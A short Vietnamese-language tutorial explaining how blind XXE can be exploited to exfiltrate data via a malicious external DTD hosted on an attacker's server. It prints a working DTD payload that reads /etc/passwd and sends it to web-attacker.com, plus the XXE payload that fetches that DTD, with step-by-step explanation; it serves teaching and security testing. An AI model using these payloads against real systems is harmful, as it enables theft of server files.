# Overview

Phát hiện một lỗ hổng XXE blind thông qua các kỹ thuật out-of-band là rất tốt, nhưng nó không thực sự chỉ ra cách lỗ hổng có thể được khai thác. Điều mà một attacker thực sự muốn đạt được là truyền tải dữ liệu nhạy cảm. Điều này có thể được thực hiện thông qua lỗ hổng XXE mù, nhưng nó bao gồm kẻ tấn công chứa một DTD độc hại trên một hệ thống mà họ kiểm soát, sau đó triệu gọi DTD bên ngoài từ trong tải XXE trong-band.

Dưới đây là một ví dụ về DTD độc hại để truyền tải nội dung của tập tin /etc/passwd:
```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://web-attacker.com/?x=%file;'>">
%eval;
%exfiltrate;
```

DTD này thực hiện các bước sau:

- Xác định một entity XML parameter có tên `file`, chứa nội dung của tập tin `/etc/passwd`.

- Xác định một entity XML parameter có tên `eval`, chứa một khai báo động của một entity XML parameter khác có tên `exfiltrate`. Entity `exfiltrate` sẽ được đánh giá bằng cách thực hiện một yêu cầu HTTP đến máy chủ web của attacker, chứa giá trị của entity file trong chuỗi truy vấn URL.

- Sử dụng entity `eval`, làm cho khai báo động của entity `exfiltrate` được thực hiện.

- Sử dụng entity `exfiltrate`, để giá trị của nó được đánh giá bằng cách yêu cầu URL đã chỉ định.

Attacker sau đó phải chứa DTD độc hại trên một hệ thống mà họ kiểm soát, thông thường là bằng cách tải nó lên máy chủ web của riêng mình. Ví dụ, attacker có thể cung cấp DTD độc hại theo đường dẫn URL sau:

`http://web-attacker.com/malicious.dtd`

Cuối cùng, attacker phải gửi tải XXE sau đây đến ứng dụng có lỗ hổng:

```xml
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM
"http://web-attacker.com/malicious.dtd"> %xxe;]>
```
Tải XXE này khai báo một entity XML parameter có tên `xxe` và sau đó sử dụng entity trong DTD. Điều này sẽ khiến trình phân tích XML truy xuất DTD bên ngoài từ máy chủ của attacker và giải thích nó trực tiếp. Các bước được xác định trong DTD độc hại sau đó được thực hiện, và tập tin `/etc/passwd` được truyền tải đến máy chủ của kẻ tấn công.
